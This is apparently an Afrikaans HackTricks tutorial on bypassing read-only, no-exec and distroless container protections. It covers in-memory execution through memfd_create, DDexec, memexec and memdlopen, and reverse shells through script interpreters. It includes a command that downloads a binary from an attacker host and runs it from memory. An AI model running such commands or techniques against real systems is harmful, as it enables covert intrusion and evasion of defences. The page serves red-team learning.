# Bypass FS beskerming: lees-slegs / geen-uitvoer / Distroless

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

As jy belangstel in 'n **hakloopbaan** en die onhakbare hak - **ons is aan die werf!** (_vloeiende Pools geskrewe en gesproke vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

In die volgende videos kan jy die tegnieke wat in hierdie bladsy genoem word, meer diepgaand verduidelik vind:

* [**DEF CON 31 - Verkenning van Linux-geheue manipulasie vir Steek en Ontwyking**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth indringings met DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## lees-slegs / geen-uitvoer scenario

Dit word al hoe meer algemeen om Linux-masjiene te vind wat gemonteer is met **lees-slegs (ro) lêersisteem beskerming**, veral in houers. Dit is omdat dit maklik is om 'n houer met 'n ro lêersisteem te hardloop deur **`readOnlyRootFilesystem: true`** in die `securitycontext` in te stel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Nogtans, selfs as die lêersisteem as ro gemonteer is, sal **`/dev/shm`** steeds skryfbaar wees, so dit is vals dat ons niks op die skyf kan skryf nie. Hierdie vouer sal egter **gemonteer word met geen-uitvoer beskerming**, so as jy 'n binêre lêer hier aflaai, **sal jy dit nie kan uitvoer nie**.

{% hint style="warning" %}
Vanuit 'n rooi span perspektief, maak dit dit **ingewikkeld om binêre lêers af te laai en uit te voer** wat nie reeds in die stelsel is nie (soos agterdeure of enumereerders soos `kubectl`).
{% endhint %}

## Maklikste omseiling: Skripte

Let daarop dat ek van binêre lêers gepraat het, jy kan **enige skrip uitvoer** solank die tolk binne die masjien is, soos 'n **skulpskrip** as `sh` teenwoordig is of 'n **python skrip** as `python` geïnstalleer is.

Nogtans is dit nie net genoeg om jou binêre agterdeur of ander binêre gereedskap wat jy mag nodig hê, uit te voer nie.

## Geheue Omseilings

As jy 'n binêre lêer wil uitvoer maar die lêersisteem dit nie toelaat nie, is die beste manier om dit te doen deur dit vanaf die geheue uit te voer, aangesien die **beskerming nie daarop van toepassing is nie**.

### FD + exec syscall omseiling

As jy kragtige skripskrywers binne die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre lêer om vanaf die geheue uit te voer aflaai, dit in 'n geheue lêerbeskrywer stoor (`create_memfd` syscall), wat nie deur daardie beskerming beskerm gaan word nie, en dan 'n **`exec` syscall** aanroep wat die **fd as die lêer om uit te voer** aandui.

Hiervoor kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre lêer deurgee en dit sal 'n skrip in die aangeduide taal genereer met die **binêre lêer saamgepers en b64 gekodeer** met die instruksies om dit te **dekodeer en te dekompres** in 'n **fd** wat geskep is deur die `create_memfd` syscall te roep en 'n oproep na die **exec** syscall om dit uit te voer.

{% hint style="warning" %}
Dit werk nie in ander skripskryftale soos PHP of Node nie omdat hulle geen **standaard manier het om rou syscalls** vanaf 'n skrip te roep nie, so dit is nie moontlik om `create_memfd` te roep om die **geheue fd** te skep om die binêre te stoor nie.

Verder, 'n **gewone fd** met 'n lêer in `/dev/shm` skep sal nie werk nie, omdat jy nie toegelaat sal word om dit uit te voer nie omdat die **geen-uitvoer beskerming** van toepassing sal wees.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou in staat stel om die geheue van jou eie proses te **modifiseer** deur sy **`/proc/self/mem`** te oorskryf.

Daarom, deur die samestellingskode te beheer wat deur die proses uitgevoer word, kan jy 'n **shellkode** skryf en die proses "muteer" om **enige arbitrêre kode uit te voer**.

{% hint style="success" %}
**DDexec / EverythingExec** sal jou in staat stel om jou eie **shellkode** of **enige binêre** vanaf **geheue** te laai en **uit te voer**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode gedemoniseer**, sodat elke keer as jy 'n **verskillende binêre lêer wil hardloop** hoef jy nie DDexec weer te begin nie, jy kan net memexec shellcode hardloop via die DDexec tegniek en dan **met hierdie duiwel kommunikeer om nuwe binêre lêers te stuur om te laai en te hardloop**.

Jy kan 'n voorbeeld vind van hoe om **memexec te gebruik om binêre lêers van 'n PHP omgekeerde dop te hardloop** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **makliker manier toe om binêre lêers in geheue te laai** om hulle later uit te voer. Dit kan selfs toelaat om binêre lêers met afhanklikhede te laai.

## Distroless Omgewing

### Wat is distroless

Distroless houers bevat slegs die **kaal minimum komponente wat nodig is om 'n spesifieke aansoek of diens te hardloop**, soos biblioteke en hardloop afhanklikhede, maar sluit groter komponente uit soos 'n pakkettebestuurder, dop, of stelsel nutsmaatskappye.

Die doel van distroless houers is om die **aanvalsvlak van houers te verminder deur onnodige komponente te elimineer** en die aantal kwesbaarhede wat uitgebuit kan word te minimeer.

### Omgekeerde Dop

In 'n distroless houer mag jy dalk **nie eers `sh` of `bash`** vind om 'n gewone dop te kry nie. Jy sal ook nie binêre lêers soos `ls`, `whoami`, `id`... vind nie, alles wat jy gewoonlik in 'n stelsel hardloop.

{% hint style="warning" %}
Daarom sal jy **nie** in staat wees om 'n **omgekeerde dop** te kry of die stelsel te **opsom** soos jy gewoonlik doen nie.
{% endhint %}

Maar as die gekompromiteerde houer byvoorbeeld 'n flask web hardloop, dan is python geïnstalleer, en dus kan jy 'n **Python omgekeerde dop** kry. As dit node hardloop, kan jy 'n Node omgekeerde dop kry, en dieselfde met meeste enige **skrips taal**.

{% hint style="success" %}
Deur die skrips taal te gebruik kan jy die stelsel **opsom** deur die taal se vermoëns te gebruik.
{% endhint %}

As daar **geen `read-only/no-exec`** beskerming is nie, kan jy jou omgekeerde dop misbruik om **binêre lêers in die lêersisteem te skryf** en hulle **uit te voer**.

{% hint style="success" %}
Maar in hierdie soort houers sal hierdie beskermings gewoonlik bestaan, maar jy kan die **vorige geheue uitvoer tegnieke gebruik om hulle te omseil**.
{% endhint %}

Jy kan **voorbeelde** vind van hoe om **sekere RCE kwesbaarhede te misbruik** om skrips taal **omgekeerde doppe** te kry en binêre lêers uit geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

As jy belangstel in 'n **hackingsloopbaan** en die onhackbare wil hack - **ons is aan die werf!** (_vloeiende Pools geskrewe en gespreek benodig_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Leer AWS hack van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **laai HackTricks af in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hackingswenke deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
